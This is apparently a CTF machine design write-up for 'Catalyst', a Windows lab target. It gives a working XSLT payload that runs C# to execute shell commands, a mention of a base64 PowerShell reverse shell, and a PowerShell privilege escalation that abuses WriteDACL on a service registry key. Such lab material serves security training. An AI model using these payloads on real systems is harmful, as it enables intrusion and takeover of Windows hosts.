# CTF Machine: Catalyst

## Overview

**Name:** Catalyst
**Difficulty:** Medium
**OS:** Windows 10 Pro
**Domain:** `catalyst.local`
**Theme:** XML report generation platform with .NET XSLT transformation engine allowing embedded C# code execution

**Story:** Catalyst Analytics provides an XML report generation platform. Users upload XSLT stylesheets to format data exports. The .NET `XslCompiledTransform` is initialized with `enableScript=true`, allowing embedded C# code blocks inside XSLT to execute OS commands. The `catalyst_svc` service account has WriteDACL on a Windows service registry key, enabling privilege escalation to SYSTEM.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Web | IIS + ASP.NET 4.8 (port 80/443) |
| Application | Report generation engine — XslCompiledTransform(enableScript:true) |
| Service | CatalystWorker — runs as LocalSystem |
| Open Ports | 80/443 (IIS), 5985 (WinRM), 3389 (RDP — firewall blocked) |
| App runs as | `catalyst_svc` (IIS AppPool identity) |

---

## Attack Chain

### 1 → Recon + Registration — Anonymous → Authenticated User

Self-registration is open at `/register`. After login, the dashboard allows uploading XML data + XSLT stylesheets to generate formatted reports via `POST /report/generate`.

---

### 2 → XSLT Code Execution — Authenticated → catalyst_svc

Upload a basic XSLT to confirm .NET MSXSL (`system-property('xsl:vendor')` returns "Microsoft"). Then use `msxsl:script` with embedded C# to execute OS commands.

**Exploitation:**
```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:user">
  <msxsl:script language="C#" implements-prefix="user">
  <![CDATA[
    public string exec(string cmd) {
      var p = new System.Diagnostics.Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + cmd;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();
      return p.StandardOutput.ReadToEnd();
    }
  ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec('whoami')"/>
  </xsl:template>
</xsl:stylesheet>
```

Update exec call to `powershell -e <base64>` for reverse shell as `catalyst_svc`.

🚩 **user.txt** → `C:\Users\catalyst_svc\Desktop\user.txt`

---

### 3 → WriteDACL on Service Registry Key — catalyst_svc → SYSTEM

Enumerate SYSTEM services → find `CatalystWorker` (runs as LocalSystem). Check registry ACL: `catalyst_svc` has WriteKey + WriteDACL on `HKLM:\SYSTEM\CurrentControlSet\Services\CatalystWorker`.

**Exploitation:**
```powershell
# Grant FullControl via WriteDACL
$svcPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CatalystWorker"
$acl = Get-Acl $svcPath
$rule = New-Object Security.AccessControl.RegistryAccessRule("catalyst_svc","FullControl","Allow")
$acl.SetAccessRule($rule); Set-Acl $svcPath $acl

# Change service binary path
Set-ItemProperty $svcPath -Name ImagePath -Value "cmd /c net localgroup administrators catalyst_svc /add"

# Restart service
sc.exe stop CatalystWorker; sc.exe start CatalystWorker
```

🚩 **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

---

## Rabbit Holes

### Rabbit Hole 1: XSLT without msxsl:script
**What the solver finds:** Standard XSLT functions like `document()`, `unparsed-text()`.
**Why it looks promising:** Could allow file read or SSRF.
**Why it's a dead end:** Blocked by the .NET runtime in this configuration — only the script block works.

### Rabbit Hole 2: CatalystWorker.exe Binary Replacement
**What the solver finds:** The service binary at `C:\CatalystApp\worker\CatalystWorker.exe`.
**Why it looks promising:** Replace the binary with a malicious one.
**Why it's a dead end:** The directory is NOT writable by `catalyst_svc` — registry manipulation is required.

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | `C:\Users\catalyst_svc\Desktop\user.txt` | catalyst_svc |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` | Administrator / SYSTEM |

---

## Full Chain Diagram

```
Anonymous
    │  Self-registration → login
    │  XSLT upload with msxsl:script C# code execution
    │  Reverse shell as catalyst_svc
    ▼
catalyst_svc  →  user.txt
    │  Enumerate SYSTEM services → CatalystWorker
    │  WriteDACL on service registry key
    │  Grant FullControl → modify ImagePath → restart
    ▼
Administrator  →  root.txt
```
